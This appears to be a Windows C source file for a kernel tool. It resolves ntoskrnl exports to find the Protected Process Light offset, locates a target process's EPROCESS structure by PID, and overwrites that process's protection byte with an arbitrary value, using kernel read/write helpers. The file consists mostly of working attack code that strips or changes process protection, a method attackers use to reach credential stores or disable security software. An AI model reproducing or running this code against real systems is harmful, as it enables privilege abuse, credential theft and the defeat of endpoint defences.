
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

#include "eprocess.h"


static  WORD PPOffset;
static  WORD PPLOffset;


int FindPPOfssets(){
    // 1) load on-disk image
    HMODULE hNtos = LoadLibraryExA(
        "ntoskrnl.exe",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );
    if (!hNtos) {
        printf("Failed to map ntoskrnl.exe\n");
        return 1;
    }
    //printf("[+] Find Offset's\n");

    // 2) get export and compute RVA
    FARPROC PsIsProtectedProcessPTR = GetProcAddress(hNtos, "PsIsProtectedProcess");
    ULONG_PTR PPrva = (ULONG_PTR)PsIsProtectedProcessPTR - (ULONG_PTR)hNtos;
    //printf("    + RVA of PsIsProtectedProcess = 0x%IX\n", PPrva);


    FARPROC PsIsProtectedProcessLightPTR = GetProcAddress(hNtos, "PsIsProtectedProcessLight");
    ULONG_PTR PPLrva = (ULONG_PTR)PsIsProtectedProcessLightPTR - (ULONG_PTR)hNtos;
    //printf("    + RVA of PsIsProtectedProcessLight = 0x%IX\n", PPLrva);

    // 3) get real kernel base
    LPVOID drivers[16];
    DWORD cb;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
        printf("EnumDeviceDrivers failed\n");
        return 1;
    }
    ULONG_PTR krnlBase = (ULONG_PTR)drivers[0];
    //printf("    + Kernel base is 0x%p\n", (PVOID)krnlBase);

    // 4) compute real address
    ULONG_PTR realPPAddr = krnlBase + PPrva;
    //printf("    + Real PsIsProtectedProcess kernel address: 0x%p\n", (PVOID)realPPAddr);
    ULONG_PTR realPPLAddr = krnlBase + PPLrva;
    //printf("    + Real PsIsProtectedProcessLight kernel address: 0x%p\n", (PVOID)realPPLAddr);


    //printf("[+] Read Offset's value from Kernel\n");
    UINT64 PPaddr = realPPAddr;
    UINT64 PPLaddr = realPPLAddr;

    
    if (!Read16(PPaddr+0x2, &PPOffset)) {
        printf("    - failed to read at 0x%llx\n", PPaddr);
        return 1;
    }

 

    if (!Read16(PPLaddr+0x2, &PPLOffset)) {
        printf("    - failed to read at 0x%llx\n", PPLaddr);
        return 1;
    }

    
    

    return 0;
}


int main(int argc, char **argv)
{

    FindPPOfssets();

    //printf("    + PsIsProtectedProcess Byte  = 0x%02X\n" , PPOffset);
    //printf("    + PsIsProtectedProcessLight Byte  = 0x%02X\n", PPLOffset);


    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    if (!FindKernelPsInitialSystemProcessOffset() ||
        !FindProcessUniqueProcessIdOffset() ||
        !FindProcessActiveProcessLinksOffset()) {
        printf("[-] failed to find offsets\n");
        return 1;
    }

    UINT64 eproc = GetEprocessByPid(pid);
    if (!eproc) {
        printf("[-] PID %u not found\n", pid);
        return 1;
    }
   
   
    unsigned long val = strtoul(argv[2], NULL, 0);
    if (val > 0xFF) {
        printf("[-] Value out of byte range: 0x%lX\n", val);
        return 1;
    }
    BYTE byteValue = (BYTE)val;
    //printf("[+] EPROCESS of PID %u is at 0x%llx\n", pid, eproc);

    UCHAR ProtectionLevel;
    Read8(eproc + PPLOffset, &ProtectionLevel);
    printf("[+] Protection Level Before Change 0x%02X \n", ProtectionLevel);
    Write8(eproc + PPLOffset, byteValue);
    printf("[+] Protection Level After Change 0x%02X \n", byteValue);

    return 0;
}
